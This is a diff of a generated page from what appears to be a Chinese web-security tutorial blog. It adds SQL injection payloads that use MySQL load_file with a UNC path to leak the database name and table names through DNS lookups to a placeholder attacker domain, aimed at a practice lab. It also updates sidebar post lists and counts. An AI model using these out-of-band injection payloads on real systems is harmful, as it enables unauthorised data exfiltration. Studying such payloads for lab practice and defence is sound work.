@@ -446,6 +446,24 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; and (select load_file(concat(&#39;</span><span class="se">\\\\</span><span class="s1">&#39;,(select database()),&#39;</span>.域名<span class="se">\\</span>a<span class="err">&#39;</span><span class="o">)))</span> --+
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>或者（推荐）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sqli_str.php?name=abc&#39; and if((select load_file(concat(&#39;\\\\&#39;,(database()),&#39;.域名\\xxx&#39;))),1,0) --+&amp;submit=submit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><font style="background-color:rgba(255, 255, 255, 0);">示例（查看当前表名）：</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sqli_str.php?name=abc&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=0x70696b61636875 limit 0,1),&#39;.域名\\xx1&#39;))),1,0) --+&amp;submit=submit
+</span></span></code></pre></td></tr></table>
+</div>
 </div><p>打开<a class="link" href="https://makabaka11.github.io/blog-files/dnslog.txt"  target="_blank" rel="noopener"
     >dnslog.py</a>并使用<kbd>Ctrl</kbd>+<kbd>S</kbd>保存文件为php根据您的实际情况适当修改配置作为虚拟靶场。</p>
 <!-- 这是一张图片，ocr 内容为： -->
@@ -701,6 +719,19 @@
             
                 
 <article class="">
+    <a href="/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.26 漏洞复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/1.25-%E6%9B%B4%E5%A4%9A%E6%9A%B4%E7%A0%B4xsscsrf%E5%92%8Csql/">
         
         
@@ -746,19 +777,6 @@
 
         <div class="article-details">
             <h2 class="article-title">1.23 SQL注入系列-3</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">1.22 SQL注入系列-2</h2>
         </div>
     </a>
 </article>
@@ -1059,8 +1077,10 @@
         
             
         
-        发表了103篇文章 · 
-        总计153.37k字
+            
+        
+        发表了104篇文章 · 
+        总计158.40k字
     </section>
 
 
